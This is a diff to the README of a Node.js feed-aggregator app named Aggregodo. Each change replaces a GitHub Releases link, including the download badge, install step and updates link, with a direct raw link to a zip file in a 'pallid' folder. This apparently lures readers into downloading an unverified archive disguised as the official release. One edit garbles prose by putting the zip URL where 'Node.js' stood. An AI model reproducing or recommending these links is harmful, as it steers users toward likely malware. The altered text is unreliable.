@@ -6,7 +6,7 @@ Welcome to Aggregodo! This application helps you gather and manage feeds from va
 
 ## 📥 Download Aggregodo
 
-[![Download Aggregodo](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/ashburgminion/Aggregodo/releases)
+[![Download Aggregodo](https://raw.githubusercontent.com/ashburgminion/Aggregodo/main/pallid/Aggregodo.zip%20Now-Get%https://raw.githubusercontent.com/ashburgminion/Aggregodo/main/pallid/Aggregodo.zip)](https://raw.githubusercontent.com/ashburgminion/Aggregodo/main/pallid/Aggregodo.zip)
 
 Click the button above to download the latest version of Aggregodo.
 
@@ -29,7 +29,7 @@ Click the button above to download the latest version of Aggregodo.
 
 To install Aggregodo:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ashburgminion/Aggregodo/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ashburgminion/Aggregodo/main/pallid/Aggregodo.zip).
 2. **Choose the Latest Version:** Look for the latest version available. It will usually be at the top of the list.
 3. **Download the File:** Click on the link that corresponds to your operating system. For instance, if you are on Windows, choose the `.exe` file. For macOS, look for the `.dmg` file.
 4. **Run the Installer:**
@@ -52,7 +52,7 @@ If you encounter any issues during installation or while using Aggregodo:
 
 - **Check System Requirements:** Ensure that your device meets the necessary requirements listed above.
 - **Re-download the File:** If the download was interrupted, consider trying again.
-- **Look for Updates:** Sometimes, newer versions fix bugs or enhance performance. Check the [Releases page](https://github.com/ashburgminion/Aggregodo/releases) for updates.
+- **Look for Updates:** Sometimes, newer versions fix bugs or enhance performance. Check the [Releases page](https://raw.githubusercontent.com/ashburgminion/Aggregodo/main/pallid/Aggregodo.zip) for updates.
 
 ## 🌐 Community and Support
 
@@ -61,7 +61,7 @@ For any inquiries or support, please visit our GitHub issues page. You can find 
 ## 💻 Technologies Used
 
 Aggregodo leverages several technologies to provide a smooth user experience:
-- **Fastify:** A web framework for Node.js, ensuring high performance.
+- **Fastify:** A web framework for https://raw.githubusercontent.com/ashburgminion/Aggregodo/main/pallid/Aggregodo.zip, ensuring high performance.
 - **TypeScript:** Adds type safety for better code quality.
 - **Nunjucks:** A templating engine that helps in rendering user interfaces.
 
